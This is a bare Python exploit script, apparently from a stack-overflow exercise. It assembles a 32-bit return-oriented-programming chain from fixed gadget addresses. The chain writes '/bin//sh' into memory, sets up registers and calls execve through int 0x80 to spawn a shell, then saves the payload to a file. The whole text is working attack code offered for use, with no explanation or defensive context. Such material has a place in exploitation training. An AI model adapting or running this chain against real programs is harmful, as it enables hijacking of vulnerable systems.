from struct import pack
import os
data = 0x080e5020
xor_eax_eax = 0x08050a28 # xor eax, eax ; ret
pop_eax = 0x080ac78a # pop eax ; ret
pop_ebx = 0x08049022 # pop ebx ; ret
pop_ecx = 0x08054f7b # pop ecx ; add al, 0xf6 ; ret
pop_edx = 0x0808b2a5 # pop edx ; xor eax, eax ; pop edi ; ret
inc_eax = 0x0809d0ce # inc eax ; ret
int_80 = 0x080499d2 # int 0x80
mov_edx_eax = 0x08080762 # mov dword ptr [edx], eax ; ret
xor_edx_edx = 0x0807b199 # xor edx, edx ; mov eax, edx ; ret
filler = 0x11111111
# Padding goes here
p = bytes('AAAA' * 6 + 'BBBB' * 1, 'ascii')
 
p += pack('<I', pop_edx) # write address of .data into edx
p += pack('<I', data)
p += pack('<I', filler)
p += pack('<I', pop_eax) # write /bin into eax
p += bytes('/bin', 'ascii')
p += pack('<I', mov_edx_eax) # mov to .data
p += pack('<I', pop_edx) # address of .data + 4 into edx
p += pack('<I', data + 4)
p += pack('<I', filler)
p += pack('<I', pop_eax) # //sh into eax
p += bytes('//sh', 'ascii')
p += pack('<I', mov_edx_eax) # mov to .data
p += pack('<I', pop_edx) # address of .data + 8 into edx
p += pack('<I', data + 8)
p += pack('<I', filler)
p += pack('<I', xor_eax_eax) # clear eax
p += pack('<I', mov_edx_eax) # write null after /bin/sh
p += pack('<I', pop_ebx)
p += pack('<I', data)
p += pack('<I', pop_ecx) # write arguments into ecx
p += pack('<I', data + 8)
p += pack('<I', xor_edx_edx) # clear edx
p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', inc_eax)
p += pack('<I', int_80) # call interrupt
print(str(p)[2:-1])
with open('payload_stack_two', 'wb') as file:
    file.write(p)